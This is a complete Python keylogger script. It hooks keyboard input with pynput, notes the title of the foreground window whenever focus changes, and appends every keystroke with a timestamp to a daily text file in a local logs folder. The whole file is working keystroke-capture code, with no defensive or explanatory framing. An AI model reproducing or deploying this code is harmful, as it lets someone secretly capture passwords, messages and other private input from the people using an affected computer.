from win32gui import GetWindowText, GetForegroundWindow
from pynput.keyboard import Listener
from datetime import datetime
from os import path
import logging

logPath = ".\\logs\\"
lastFocusName = ""

def on_press(key):

	global lastFocusName
	filename = (str(datetime.now().date()) + ".txt")
	logging.basicConfig(filename = path.join(logPath + filename), level = logging.DEBUG, format = "%(message)s")

	if lastFocusName != GetWindowText(GetForegroundWindow()):
		logging.info("\n" + GetWindowText(GetForegroundWindow()))

	lastFocusName = GetWindowText(GetForegroundWindow())
	logging.info(str(datetime.now().time()) + ": " + str(key))

with Listener(on_press=on_press) as listener:
	listener.join()
